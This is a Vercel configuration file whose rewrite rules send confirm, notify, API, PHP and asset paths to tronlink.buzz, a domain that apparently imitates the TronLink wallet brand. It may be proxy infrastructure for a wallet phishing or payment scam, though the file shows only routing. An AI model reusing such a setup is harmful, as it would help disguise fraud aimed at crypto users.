{
  "$schema": "https://openapi.vercel.sh/vercel.json",
  "rewrites": [
    {
      "source": "/index/index/confirm",
      "destination": "https://tronlink.buzz/index/index/confirm"
    },
    {
      "source": "/index/index/notify",
      "destination": "https://tronlink.buzz/index/index/notify"
    },
    {
      "source": "/api/:path*",
      "destination": "https://tronlink.buzz/api/:path*"
    },
    {
      "source": "/index.php",
      "destination": "https://tronlink.buzz/index.php"
    },
    {
      "source": "/index.php/:path*",
      "destination": "https://tronlink.buzz/index.php/:path*"
    },
    {
      "source": "/assets/:path*",
      "destination": "https://tronlink.buzz/assets/:path*"
    }
  ]
}
